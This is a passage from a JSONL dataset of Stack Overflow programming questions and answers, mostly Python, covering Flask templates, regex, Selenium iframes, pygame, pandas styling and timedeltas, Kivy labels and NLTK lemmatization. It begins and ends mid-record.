&lt;\/button&gt;\n            &lt;ul class=&quot;dropdown-menu absolute hidden text-gray-700 pt-1 shadow-none&quot; style=&quot;width: automatic !important;&quot;&gt;\n              &lt;li class=&quot;&quot;&gt;&lt;a class=&quot;py-2 px-4 block&quot; href=&quot;{{ url_for('main_bp.move_task', projectid=projectid, task_id=todo['id'], category='Complete') }}&quot;&gt;Complete&lt;\/a&gt;&lt;\/li&gt;\n              &lt;li class=&quot;&quot;&gt;&lt;a class=&quot;py-2 px-4 block&quot; onclick=&quot;openNav()&quot; href=&quot;#&quot;&gt;Edit&lt;\/a&gt;&lt;\/li&gt;\n              &lt;li class=&quot;&quot;&gt;&lt;a class=&quot;py-2 px-4 block&quot; href=&quot;{{ url_for('main_bp.delete_task', projectid=projectid, task_id=todo['id']) }}&quot;&gt;Delete&lt;\/a&gt;&lt;\/li&gt;\n            &lt;\/ul&gt;\n          &lt;\/div&gt;\n          &lt;style&gt;\n            .dropdown:hover .dropdown-menu {\n              display: block;\n              background-color: white;\n              width: 100% !important;\n              color: #454545 !important;\n              }\n        &lt;\/style&gt;\n        &lt;\/td&gt;\n<\/code><\/pre>\n<p>MY SIDEBAR FORM<\/p>\n<pre><code>        &lt;div id=&quot;mySidenav&quot; class=&quot;sidenav2&quot;&gt;\n          &lt;h2 onclick=&quot;closeNav_edit()&quot;&gt;close&lt;\/h2&gt;\n          &lt;div class=&quot;modal-body&quot;&gt;\n          &lt;form method=&quot;post&quot; action=&quot;{{ url_for('main_bp.edit_task', projectid = projectid, task_id=todo['id']) }}&quot;&gt;\n            &lt;div class=&quot;form-group&quot;&gt;\n              &lt;h3&gt;{{todo['taskname']}}&lt;\/h3&gt;\n              &lt;input style=&quot;display: none;&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;taskname&quot; name=&quot;taskname&quot; value=&quot;{{todo['taskname']}}&quot;&gt;\n              &lt;input style=&quot;display: none;&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;taskname&quot; name=&quot;taskcategory&quot; value=&quot;{{todo['category']}}&quot;&gt;\n              &lt;input style=&quot;display: none;&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;taskname&quot; name=&quot;assignee&quot; value=&quot;{{todo['assignee']}}&quot;&gt;\n              &lt;hr&gt;\n            &lt;\/div&gt;\n            &lt;div class=&quot;form-group&quot;&gt;\n              &lt;label for=&quot;completedate&quot;&gt;Status\/Progress&lt;\/label&gt;\n              &lt;select class=&quot;form-control&quot; id=&quot;taskcategory&quot; name=&quot;taskprogress&quot; required&gt;\n                &lt;option value=&quot;0%&quot;&gt;0%&lt;\/option&gt;\n                &lt;option value=&quot;25%&quot;&gt;25%&lt;\/option&gt;\n                &lt;option value=&quot;50%&quot;&gt;50%&lt;\/option&gt;\n                &lt;option value=&quot;75%&quot;&gt;75%&lt;\/option&gt;\n                &lt;option value=&quot;100%&quot;&gt;100%&lt;\/option&gt;\n              &lt;\/select&gt;\n            &lt;\/div&gt;\n            &lt;div class=&quot;form-group&quot;&gt;\n              &lt;label for=&quot;completedate&quot;&gt;Due Date&lt;\/label&gt;\n              &lt;input required class=&quot;form-control&quot; type=&quot;date&quot; id=&quot;completedate&quot; value=&quot;{{todo['completedate']}}&quot;name=&quot;completedate&quot;&gt;\n            &lt;\/div&gt;\n            &lt;div class=&quot;form-group&quot; style=&quot;display: none;&quot;&gt;\n              &lt;label for=&quot;completedate&quot;&gt;projectid&lt;\/label&gt;\n              &lt;input class=&quot;form-control&quot; id=&quot;projectid&quot; name=&quot;projectid&quot; value=&quot;{{projectid}}&quot;&gt;\n            &lt;\/div&gt;\n            &lt;div class=&quot;form-group&quot;&gt;\n              &lt;label for=&quot;taskcategory&quot;&gt;Task Lead&lt;\/label&gt;\n              &lt;select class=&quot;form-control&quot; id=&quot;taskcategory&quot; name=&quot;assignee&quot;&gt;\n                &lt;option value=&quot;{{todo['assignee']}}&quot; disabled selected&gt;{{todo['assignee']}}&lt;\/option&gt;\n                {% for team_member in team_members %}\n                &lt;option value=&quot;{{team_member}}&quot;&gt;{{team_member}}&lt;\/option&gt;\n                {% endfor  %}\n              &lt;\/select&gt;\n            &lt;\/div&gt;\n            &lt;div class=&quot;form-group&quot;&gt;\n              &lt;label for=&quot;taskcategory&quot;&gt;Task Description&lt;\/label&gt;\n              &lt;textarea class=&quot;form-control&quot; id=&quot;projectid&quot; name=&quot;taskdescription&quot; value=&quot;{{projectid}}&quot;&gt;{{todo['taskdescription']}}&lt;\/textarea&gt;\n              &lt;script&gt;\n                tinymce.init({\n                  selector: &quot;textarea&quot;,\n                  menubar : false,\n                  statusbar:false,\n                });\n              &lt;\/script&gt;\n            &lt;\/div&gt;\n            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;\/button&gt;\n          &lt;\/form&gt;\n        &lt;\/div&gt;\n        {% endfor %} \n      &lt;\/tbody&gt;\n    &lt;\/table&gt;\n<\/code><\/pre>\n<p>MY CSS AND JS<\/p>\n<pre><code>&lt;script&gt;\n           function openNav() {\n            document.getElementById(&quot;mySidenav&quot;).style.width = &quot;45%&quot;;\n        }\n        \n        function closeNav_edit() {\n            document.getElementById(&quot;mySidenav&quot;).style.width = &quot;0&quot;;\n        }\n&lt;script&gt;\n&lt;style&gt;\n           .sidenav2 {\n            height: 100%;\n            width: 0;\n            position: fixed;\n            z-index: 1;\n            top: 0;\n            right: 0;\n            background-color: white;\n            overflow-x: hidden;\n            transition: 0.5s;\n            padding-top: 60px;\n        }\n        \n        .sidenav2 a {\n            padding: 8px 8px 8px 32px;\n            text-decoration: none;\n            font-size: 25px;\n            color: #818181;\n            display: block;\n            transition: 0.3s;\n        }\n        \n        .sidenav2 a:hover, .offcanvas a:focus{\n            color: #f1f1f1;\n        }\n        \n        .sidenav2 .closebtn {\n            position: absolute;\n            top: 0;\n            right: 25px;\n            font-size: 36px;\n            margin-left: 50px;\n        }\n        \n        @media screen and (max-height: 450px) {\n          .sidenav2 {padding-top: 15px;}\n          .sidenav2 a {font-size: 18px;}\n        }\n         &lt;\/style&gt;\n<\/code><\/pre>","output_text":"<p>So, I figured out the issue. For those with a similar issue in the future.<\/p>\n<p>I had to set my sidebar id to a dynamic one. I made by sidebar id to be the id of my task. i.e. {{todo.id}}. I was facing the issue because the id was the same. Here's my fixed code:<\/p>\n<pre><code>        &lt;div id='{{todo.id}}' class=&quot;sidenav2&quot;&gt;\n      &lt;h2 onclick=&quot;closeNav_edit()&quot;&gt;close&lt;\/h2&gt;\n      &lt;div class=&quot;modal-body&quot;&gt;\n      &lt;form method=&quot;post&quot; action=&quot;{{ url_for('main_bp.edit_task', projectid = projectid, task_id=todo['id']) }}&quot;&gt;\n        &lt;div class=&quot;form-group&quot;&gt;\n          &lt;h3&gt;{{todo['taskname']}}&lt;\/h3&gt;\n          &lt;input style=&quot;display: none;&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;taskname&quot; name=&quot;taskname&quot; value=&quot;{{todo['taskname']}}&quot;&gt;\n          &lt;input style=&quot;display: none;&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;taskname&quot; name=&quot;taskcategory&quot; value=&quot;{{todo['category']}}&quot;&gt;\n          &lt;input style=&quot;display: none;&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;taskname&quot; name=&quot;assignee&quot; value=&quot;{{todo['assignee']}}&quot;&gt;\n          &lt;hr&gt;\n        &lt;\/div&gt;\n        &lt;div class=&quot;form-group&quot;&gt;\n          &lt;label for=&quot;completedate&quot;&gt;Status\/Progress&lt;\/label&gt;\n          &lt;select class=&quot;form-control&quot; id=&quot;taskcategory&quot; name=&quot;taskprogress&quot; required&gt;\n            &lt;option value=&quot;0%&quot;&gt;0%&lt;\/option&gt;\n            &lt;option value=&quot;25%&quot;&gt;25%&lt;\/option&gt;\n            &lt;option value=&quot;50%&quot;&gt;50%&lt;\/option&gt;\n            &lt;option value=&quot;75%&quot;&gt;75%&lt;\/option&gt;\n            &lt;option value=&quot;100%&quot;&gt;100%&lt;\/option&gt;\n          &lt;\/select&gt;\n        &lt;\/div&gt;\n        &lt;div class=&quot;form-group&quot;&gt;\n          &lt;label for=&quot;completedate&quot;&gt;Due Date&lt;\/label&gt;\n          &lt;input required class=&quot;form-control&quot; type=&quot;date&quot; id=&quot;completedate&quot; value=&quot;{{todo['completedate']}}&quot;name=&quot;completedate&quot;&gt;\n        &lt;\/div&gt;\n        &lt;div class=&quot;form-group&quot; style=&quot;display: none;&quot;&gt;\n          &lt;label for=&quot;completedate&quot;&gt;projectid&lt;\/label&gt;\n          &lt;input class=&quot;form-control&quot; id=&quot;projectid&quot; name=&quot;projectid&quot; value=&quot;{{projectid}}&quot;&gt;\n        &lt;\/div&gt;\n        &lt;div class=&quot;form-group&quot;&gt;\n          &lt;label for=&quot;taskcategory&quot;&gt;Task Lead&lt;\/label&gt;\n          &lt;select class=&quot;form-control&quot; id=&quot;taskcategory&quot; name=&quot;assignee&quot;&gt;\n            &lt;option value=&quot;{{todo['assignee']}}&quot; disabled selected&gt;{{todo['assignee']}}&lt;\/option&gt;\n            {% for team_member in team_members %}\n            &lt;option value=&quot;{{team_member}}&quot;&gt;{{team_member}}&lt;\/option&gt;\n            {% endfor  %}\n          &lt;\/select&gt;\n        &lt;\/div&gt;\n        &lt;div class=&quot;form-group&quot;&gt;\n          &lt;label for=&quot;taskcategory&quot;&gt;Task Description&lt;\/label&gt;\n          &lt;textarea class=&quot;form-control&quot; id=&quot;projectid&quot; name=&quot;taskdescription&quot; value=&quot;{{projectid}}&quot;&gt;{{todo['taskdescription']}}&lt;\/textarea&gt;\n          &lt;script&gt;\n            tinymce.init({\n              selector: &quot;textarea&quot;,\n              menubar : false,\n              statusbar:false,\n            });\n          &lt;\/script&gt;\n        &lt;\/div&gt;\n        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;\/button&gt;\n      &lt;\/form&gt;\n    &lt;\/div&gt;\n    {% endfor %} \n  &lt;\/tbody&gt;\n&lt;\/table&gt;\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to use python regex to recover decimal strings from a website<p>I'm trying to scrape this website:<\/p>\n<p><a href=\"https:\/\/download.kde.org\/stable\/frameworks\" rel=\"nofollow noreferrer\">https:\/\/download.kde.org\/stable\/frameworks<\/a><\/p>\n<p>to recover the latest series of kde packages.<\/p>\n<p>here is the code I've tried so far:<\/p>\n<pre><code>#!\/usr\/bin\/env python3\n\nfrom requests import get\nfrom bs4 import BeautifulSoup\nimport re\nimport sys, os\n\nr = re.compile(r'^[0-9]*[.,]{0,1}[0-9]*$')\n\nurl=&quot;https:\/\/download.kde.org\/stable\/frameworks&quot;\nresponse = get(url)\nhtml_soup = BeautifulSoup(response.text, 'html.parser')\n\nfor tag in html_soup.findAll('a', href=True):\n#  if r.match(str(tag['href'])): print(str(tag['href']))\n  print(str(tag['href']))\n\n<\/code><\/pre>\n<p>If you uncomment the &quot;if r.match ...&quot; line, you can see it doesn't find any matches, but it should print the 5.78 to 5.83 lines.<\/p>\n<p>I think the regex should find strings of the form 5.78, so am I using r.match in the wrong way?<\/p>","output_text":"<p>You can use<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>r = re.compile(r'^\\d+(?:[.,]?\\d+)?\/?$')\n<\/code><\/pre>\n<p>The regex matches:<\/p>\n<ul>\n<li><code>^<\/code> - start of string<\/li>\n<li><code>\\d+<\/code> - one or more digits<\/li>\n<li><code>(?:[.,]?\\d+)?<\/code>  - an optional occurrence of <code>.<\/code> or <code>,<\/code> and then one or more digits<\/li>\n<li><code>\/?<\/code> - an optional <code>\/<\/code><\/li>\n<li><code>$<\/code>  - end of string.<\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Selenium - Unable to find input elements inside iframe using SwitchTo()<p>I have a hard time locating two input elements of a specific website.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/AFaH1.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/AFaH1.jpg\" alt=\"website\" \/><\/a><\/p>\n<p>Well, as you can see above, &quot;username&quot; input element and &quot;password&quot; input element are inside an iframe with id = tab1.<\/p>\n<p>So I tried (among other things) something like this:<\/p>\n<pre><code>driver = webdriver.Firefox()\n\ndriver.get('https:\/\/www.website.com\/sites\/en\/Pages\/default.aspx')\n\ndriver.SwitchTo().Frame(driver.FindElement(By.id(&quot;tab1&quot;)));\n\nusername = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '\/\/*[@id=&quot;login-form&quot;]\/div[1]\/input')))\nusername.send_keys(credentials.username)\n\npassword = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '\/\/*[@id=&quot;login-form&quot;]\/div[2]\/input')))\npassword.send_keys(credentials.password)\n\nsubmit = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '\/\/*[@id=&quot;loginBtn&quot;]')))\n\naction = ActionChains(driver)\naction.move_to_element(submit).click().perform()\n<\/code><\/pre>\n<p>That is, I switched to frame &quot;tab1&quot; and then searched for the elements with their XPath. (Both full XPath and simple XPath).<\/p>\n<p>But I get the following error again and again:<\/p>\n<blockquote>\n<p>Process finished with exit code -1073740791 (0xC0000409)<\/p>\n<\/blockquote>\n<p>without even activating &quot;try-except&quot; to show me something I can use for debugging.<\/p>\n<p>Well, the question is: can I locate these elements somehow?<\/p>\n<p>Thank you in advance.<\/p>","output_text":"<pre><code>wait=WebDriverWait(driver,10) \nwait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR,&quot;#tab1&quot;)))\n<\/code><\/pre>\n<p>You are using Java use Python instead and waits.<\/p>\n<pre><code>driver.SwitchTo().Frame(driver.FindElement(By.id(&quot;tab1&quot;)));\n<\/code><\/pre>\n<p>Imports:<\/p>\n<pre><code>from selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait \nfrom selenium.webdriver.support import expected_conditions as EC\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to disable keyboard events in Pygame?<p>I'm using pygame inside Blender to get multitouch support.<\/p>\n<p>Unfortunately pygame catches all keyboard input which makes it impossible to use shortcuts in Blender.<\/p>\n<p>Can someone help me to unsubscribe from all keyboard events?<\/p>\n<p>Thank you<\/p>","output_text":"<p>The problem was, that i used win32gui to render pygame always on top.\nThe with the &quot;win32con.SWP_NOACTIVATE&quot; flag, i could force pygame to be inactive and blender to be active.<\/p>\n<pre><code>    hwnd = pg.display.get_wm_info()[&quot;window&quot;]\n\n    rect = win32gui.GetWindowRect(hwnd)\n    x = rect[0]\n    y = rect[1]\n    w = rect[2] - x\n    h = rect[3] - y\n\n    win32gui.SetWindowLong (hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong (hwnd, win32con.GWL_EXSTYLE ) | win32con.WS_EX_LAYERED )\n    win32gui.SetWindowPos(hwnd, win32con.HWND_TOP, x, y, w, h, win32con.SWP_NOACTIVATE) \n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n is there any way i can apply another style on a styler in pandas<p>I have NAN values in my dataframe columns and i need to replace it with empty string. I need to perform subtraction on these columns, so when replacing with empty string i am getting error:<\/p>\n<blockquote>\n<p>unsupported operand types for -:'str' and 'str'.<\/p>\n<\/blockquote>\n<p>so while applying style to my dataframe i have added this line, and it is working as well:<\/p>\n<pre><code>df.style.set_na_rep('')\n<\/code><\/pre>\n<p>But when i am adding format function to the style, to concat '%' symbol in the columns, the NAN values are reappearing along withe the '%' symbol.<\/p>\n<p>Then syntax is:<\/p>\n<pre><code>df = (df.style.apply(highlight_cells, axis = None).set_na_rep('')).format({'B':'{:}%','C':'{:}%'}).set_table_styles(...)\n<\/code><\/pre>\n<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th style=\"text-align: left;\">A<\/th>\n<th style=\"text-align: center;\">B<\/th>\n<th style=\"text-align: right;\">C<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">ab<\/td>\n<td style=\"text-align: center;\">8.3%<\/td>\n<td style=\"text-align: right;\">4.7%<\/td>\n<\/tr>\n<tr>\n<td style=\"text-align: left;\">cd<\/td>\n<td style=\"text-align: center;\">9.0%<\/td>\n<td style=\"text-align: right;\">NAN%<\/td>\n<\/tr>\n<tr>\n<td style=\"text-align: left;\">ef<\/td>\n<td style=\"text-align: center;\">NAN%<\/td>\n<td style=\"text-align: right;\">NAN%<\/td>\n<\/tr>\n<tr>\n<td style=\"text-align: left;\">gh<\/td>\n<td style=\"text-align: center;\">NAN%<\/td>\n<td style=\"text-align: right;\">13.9%<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<\/div>\n<p>can anyone please suggest, I am pretty new in pandas and dataframes.\nThanks<\/p>","output_text":"<p>In the latest version of pandas 1.3.0 <code>set_na_rep()<\/code> is deprecated and you should use <code>format(na_rep=&quot;xx&quot;)<\/code> instead.<\/p>\n<p>If the values are truly missing, i.e. they are <code>pd.nan<\/code> and  <code>pd.isna(val)<\/code> returns <code>True<\/code> then the value will be substitututed for the display value of <code>na_rep<\/code>.<\/p>\n<p>On the other hand if you have previously performed some manipulation and the value is a string representation of 'NAN', then this is not a missing value (it is a string), and the <code>na_rep<\/code> argument will have no effect.<\/p>\n<p>Actually you can see the relevant issue to this here (<a href=\"https:\/\/github.com\/pandas-dev\/pandas\/pull\/40060\" rel=\"nofollow noreferrer\">https:\/\/github.com\/pandas-dev\/pandas\/pull\/40060<\/a>) and the ultimate solution (<a href=\"https:\/\/github.com\/pandas-dev\/pandas\/pull\/40134\" rel=\"nofollow noreferrer\">https:\/\/github.com\/pandas-dev\/pandas\/pull\/40134<\/a>)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to convert Days in dataframe column to an integer in pandas?<p>I have the following column in my dataframe (it has many more rows but they are all in this format):<\/p>\n<pre><code>1st Year Score\n365 days 00:00:00\n163 days 00:00:00\n365 days 00:00:00\n143 days 00:00:00\n365 days 00:00:00\n365 days 00:00:00\n52 days 00:00:00\n<\/code><\/pre>\n<p>And I want to produce this:<\/p>\n<pre><code>1st Year Score\n365 \n163 \n365 \n143 \n365 \n365 \n52 \n<\/code><\/pre>\n<p>I have tried the following:<\/p>\n<pre><code>data['1st Year Score'] = data['1st Year Score'].dt.days()\n\nAttributeError: Can only use .dt accessor with datetimelike values\n<\/code><\/pre>\n<p>I also tried:<\/p>\n<pre><code>data['1st Year Score'] = pd.to_datetime(data['1st Year Score'],errors='coerce')\n<\/code><\/pre>\n<p>which deleted everything in my 1st year column.  Let me know how to fix this, thank you.<\/p>","output_text":"<p>Try via <code>pd.to_timedelta()<\/code>:<\/p>\n<pre><code>df['1st Year Score']=pd.to_timedelta(df['1st Year Score']).dt.days\n<\/code><\/pre>\n<p>output of <code>df['1st Year Score']<\/code>:<\/p>\n<pre><code>0    365\n1    163\n2    365\n3    143\n4    365\n5    365\n6     52\nName: 1st Year Score, dtype: int64\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Adding Two Lists into One Dictionary (Python)<p>I have two lists, one containing a list of keys, and another containing the values to be assigned to each key, chronologically, by key.<\/p>\n<p>For example;<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>key_list = ['cat', 'dog', 'salamander']\nvalue_list = [1, 2, 3, 4, 5, 6, 7, 8, 9]\n<\/code><\/pre>\n<p>I'm looking to make a quick method that takes these two lists, and from it can spit out a dictionary that looks like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>key_value_pairs = {\n    'cat': [1, 4, 7],\n    'dog': [2, 5, 8],\n    'salamander': [3, 6, 9]\n}\n<\/code><\/pre>\n<p>Regardless of the length of the values, I'm looking for a way to just iterate through each value and amend them to a dictionary containing one entry for each item in the key_list.  Any ideas?<\/p>","output_text":"<p><code>key_value_pairs = {k: [v for v_i, v in enumerate(value_list) if v_i % len(key_list) == k_i] for k_i, k in enumerate(key_list)}<\/code><\/p>\n<p><strong>Edit:<\/strong> that's a fun one-liner, but it has worse time complexity than the following solution, which doesn't use any nested loops:<\/p>\n<pre><code>lists = [[] for _ in key_list]\nfor i, v in enumerate(value_list):\n    lists[i % len(key_list)].append(v)\n\nkey_value_pairs = dict(zip(keys, lists))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to use \"in\" keyword in c++<p>Hey I am a new C++ learner, I have been creating a program that do something specific...\nI take input from the user, and converted it into a lowercased sentence,  then I use the &quot;in&quot;keyword like we use in python.... For example in python :<\/p>\n<pre><code>main_input = input(&quot;Type exit with a bunch of other words: &quot;)\nlower_input = main_input.lower()\nif &quot;exit&quot; in lower_input:\n    exit()\nelse:\n    pass\n<\/code><\/pre>\n<p>What this does is that searches for the exit keyword from the input(like &quot;ok you can <strong>exit<\/strong> now&quot;) and follows accordingly, exits the program.\nBut how to use &quot;in&quot; keyword in c++?\n<strong>I want to do something like this<\/strong>:<\/p>\n<pre><code>#include &lt;iostream&gt;\n#include &quot;boost\/algorithm\/string.hpp&quot;\nusing namespace std;\n\nint main() {\n\n    while(true){\n        std::string main_input;\n        std::cout &lt;&lt; &quot;Type something: &quot;;\n        std::cin &gt;&gt; main_input;\n        std::string lower_input = boost::algorithm::to_lower_copy(main_input);\n\/* the if statement below this, here is the problem...*\/\n        if(&quot;exit&quot; in lower_input){\n            std::cout &lt;&lt; &quot;Exiting&quot;;\n            \/* after that other statements if necessary to execute*\/\n\n        }\n\n    }\n  \n}\n<\/code><\/pre>\n<p>Can anyone tell me how to do that?? Thanks in advance!<\/p>","output_text":"<p>You can use the member function <code>find<\/code> of the class <code>std::string<\/code>.<\/p>\n<p>Something like<\/p>\n<pre><code>if ( lower_input.find( &quot;exit&quot; ) != std::string::npos ){\n<\/code><\/pre>\n<p>But it would be more accurate to write<\/p>\n<pre><code>if ( lower_input == &quot;exit&quot; ) {\n<\/code><\/pre>\n<p>because the user can enter a sentence that contains the symbols &quot;exit&quot; without an intention to break the loop.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Can't get kivy label to update through variable<p>I'm trying to get an App working where I get a list of folders in a directory, displayed in kivy recycleview. I then want to select one of the Folders and have it's name showing up in a label. I'm new to kivy and fairly new to python and after over two days and reading posts several times over and over again, I just can't manage to get the selected folder being displayed in the label. I got it working if I called the function through a button in kv but not through the SelectableButton class.<\/p>\n<p>My .py file:<\/p>\n<pre><code>from kivy.app import App\nfrom kivy.uix.button import Button\nfrom kivy.uix.widget import Widget\nfrom kivy.properties import ListProperty, StringProperty, ObjectProperty, BooleanProperty\nfrom kivy.uix.recycleview import RecycleView\nfrom kivy.uix.recycleview.views import RecycleDataViewBehavior\nfrom kivy.uix.recycleboxlayout import RecycleBoxLayout\nfrom kivy.uix.recycleview.layout import LayoutSelectionBehavior\nfrom kivy.uix.behaviors import FocusBehavior\nfrom kivy.uix.boxlayout import BoxLayout\n\n\nprjct_list_clean = ['Folder1', 'Folder2', 'Folder3', 'Folder4', 'Folder5', 'Folder6']\n\nclass SelectableRecycleBoxLayout(FocusBehavior, LayoutSelectionBehavior, RecycleBoxLayout):\n    &quot;&quot;&quot; Adds selection and focus behaviour to the view. &quot;&quot;&quot;\n    selected_value = StringProperty('')\n    btn_info = ListProperty(prjct_list_clean)\n\nclass SelectableButton(RecycleDataViewBehavior, Button, Widget):\n    &quot;&quot;&quot; Add selection support to the Label &quot;&quot;&quot;\n    index = None\n    selected = BooleanProperty(False)\n    selectable = BooleanProperty(True)\n\n#############################ProblemPart###################################\n\n    def on_press(self):\n        con_wksp = str(self.text)\n        self.ids.con_wksp_label = con_wksp\n        print(self.ids.con_wksp_label) #Value gets printet\n\n###########################################################################\n\nclass RV(RecycleView):\n    rv_layout = ObjectProperty(None)\n\n    def __init__(self, **kwargs):\n        super(RV, self).__init__(**kwargs)\n        self.data = []\n        for subject in prjct_list_clean:\n            self.data.append({'text':subject})\n        print(prjct_list_clean)\n\nclass SelectedWksp(Widget):\n    pass\n\nclass TroubleshootApp(BoxLayout, App,):\n    def build(self):\n        self.add_widget(RV())\n        self.add_widget(SelectedWksp())\n        return self\n\nif __name__ == &quot;__main__&quot;:\n    TroubleshootApp().run()\n<\/code><\/pre>\n<p>My .kv file:<\/p>\n<pre><code>#:kivy 2.0.0\n\n&lt;RV&gt;:\n    rv_layout: rv_layout\n    bar_width: 0\n    viewclass: 'SelectableButton'\n    SelectableRecycleBoxLayout:\n        id: rv_layout\n        default_size: None, dp(56)\n        default_size_hint: 0.9, None\n        size_hint_y: None\n        height: self.minimum_height\n        orientation: &quot;vertical&quot;\n\n&lt;SelectedWksp&gt;:\n    BoxLayout:\n        Label:\n            id: con_wksp_label\n            text: 'Default'\n<\/code><\/pre>\n<p>I'm sure it's probably some simple rookie mistake, but I just can't get my head around it.<\/p>\n<p>Thank you for everyones time.<\/p>","output_text":"<p>You can change your <code>on_press()<\/code> method to:<\/p>\n<pre><code>def on_press(self):\n    App.get_running_app().set_label(self.text)\n<\/code><\/pre>\n<p>and modify your App class to:<\/p>\n<pre><code>class TroubleshootApp(BoxLayout, App,):\n    def build(self):\n        self.add_widget(RV())\n        self.wksp = SelectedWksp()   # save a reference to the SelecetedWksp instance\n        self.add_widget(self.wksp)\n        return self\n\n    def set_label(self, txt):   # set the text of the label\n        self.wksp.ids.con_wksp_label.text = txt\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can words with misspellings be corrected in a data frame?<p>I have a data frame and I want the wrong words to be edited in it. First i delete the characters that have been repeated more than twice in a word and then i apply Spell Correction on it. For the first part, I can only apply changes on strings. I want to be able to apply it to the data frame as well. How can I do this?<\/p>\n<pre><code>text='Aye concreeete steel and plastic housesss will keep us alll safe and flourishing ?'\n\n\nimport re\ndef reduce_lengthening(text):\n        pattern = re.compile(r&quot;(.)\\1{2,}&quot;)\n        return pattern.sub(r&quot;\\1\\1&quot;, text)\n    \n\nprint('string is: ',reduce_lengthening(text))\n<\/code><\/pre>\n<p>out put string is:<\/p>\n<p><code>Aye concreete steel and plastic housess will keep us all safe and flourishing ?<\/code><\/p>\n<p>How can I apply this function to the following data frame?<\/p>\n<pre><code>text=['dear pados wali anttty , can  just keep your thoughts and nose out  business raising_hands  thaaaank .',\n'but  least  did not call him losers  suckers ,  juuust was did not want   the cemetery and honor them ,  big deal.',\n'some hunters are just entitled , you are lucky  have them.',\n'thin corrrect time that.. only one person could save  from this crisis  ..   correct sarthak ? ?',\n'thereee  also the wuhan virus.   that totally different ?',\n'does nooot every woman hav  adam apple amp;  flat hairy chest ?']\nimport pandas as pd\ndf=pd.DataFrame()\ndf['Text']=text\n<\/code><\/pre>","output_text":"<p>If you have do it with <code>apply<\/code> function like below<\/p>\n<pre><code>df[&quot;Text&quot;] = df[&quot;Text&quot;].apply(reduce_lengthening)\n<\/code><\/pre>\n<p>or before adding this column ( <code>using <\/code>df['Text']=text<code>),you can pass each text element to <\/code>reduce_lengthening` in list comprehension like this, and store the resulting list<\/p>\n<pre><code>df[&quot;Text&quot;] = [reduce_lengthening(x) for x in text]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Using WordNetLemmatizer.lemmatize() with pos_tags throws KeyError<p>I just read that lemmatization results are best when assisted with pos_tags. Hence I followed the below code but getting KeyError for calculated POS_tags. Below is the code<\/p>\n\n<pre><code>   from nltk import pos_tag\n   x['Phrase']=x['Phrase'].transform(lambda value:value.lower())\n   x['Phrase']=x['Phrase'].transform(lambda value:pos_tag(value))\n<\/code><\/pre>\n\n<p>Output after 3rd line (after calculating POS Tags)\n<a href=\"https:\/\/i.stack.imgur.com\/VTiwd.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/VTiwd.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<pre><code>   from nltk.stem import WordNetLemmatizer \n   lemmatizer = WordNetLemmatizer()\n   x['Phrase_lemma']=x['Phrase'].transform(lambda value: ' '.join([lemmatizer.lemmatize(a[0],pos=a[1]) for a in  value]))\n<\/code><\/pre>\n\n<p>Error:<\/p>\n\n<pre><code> KeyError                                  Traceback (most recent call last)\n  &lt;ipython-input-8-c2400a79a016&gt; in &lt;module&gt;\n  1 from nltk.stem import WordNetLemmatizer\n  2 lemmatizer = WordNetLemmatizer()\n  ----&gt; 3 x['Phrase_lemma']=x['Phrase'].transform(lambda value: ' '.join([lemmatizer.lemmatize(a[0],pos=a[1]) for a in  value]))\n\n KeyError: 'DT'\n<\/code><\/pre>","output_text":"<p>You get a <code>KeyError<\/code> because <code>wordnet<\/code> is not using the same <code>pos<\/code> labels. The accepted <code>pos<\/code> labels for <code>wordnet<\/code> based on <a 